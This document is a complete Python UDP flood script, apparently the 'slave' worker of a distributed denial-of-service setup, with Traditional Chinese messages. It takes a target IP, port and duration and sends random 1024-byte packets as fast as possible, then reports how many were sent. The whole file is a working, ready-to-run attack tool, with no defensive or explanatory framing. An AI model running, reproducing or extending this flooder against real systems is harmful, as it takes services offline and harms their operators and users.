import socket
import random
import time
import sys

def udp_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    timeout = time.time() + duration
    sent = 0
    while time.time() < timeout:
        data = random._urandom(1024)
        sock.sendto(data, (target_ip, target_port))
        sent += 1
    print(f"[Slave] 攻擊結束，總共傳送 {sent} 個封包到 {target_ip}:{target_port}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("用法：python3 udp_flood_slave.py <目標IP> <目標Port> <持續秒數>")
        sys.exit(1)
    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    udp_flood(ip, port, duration)
